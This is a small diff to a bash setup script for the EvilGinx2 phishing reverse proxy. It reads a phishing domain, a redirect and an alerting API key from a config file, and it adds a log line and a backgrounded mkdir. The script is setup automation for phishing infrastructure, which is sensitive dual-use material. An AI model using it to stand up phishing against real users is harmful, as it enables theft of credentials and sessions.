@@ -186,6 +186,9 @@ send_opsgenie_alert() {
     echo "Response: $response"
 }
 
+#Log checking purposes
+echo "Starting setup script..." >&2
+
 # Read configuration from config.json
 config_file="config.json"
 domain_name=$(jq -r '.EvilGinx2.Domain_Name' "$config_file")
@@ -195,7 +198,7 @@ default_redirect=$(jq -r '.EvilGinx2.default_redirect' "$config_file")
 opsgenie_api_key=$(jq -r '.Opsgenie_API_Key' "$config_file")
 
 #Make the needed shared subirectories
-mkdir -p /shared-data/fresh-data /shared-data/used-data
+mkdir -p /shared-data/fresh-data /shared-data/used-data &
 
 if [ -d "/root/.evilginx/EG2_DB" ]; then
     rm -rf /root/.evilginx/EG2_DB
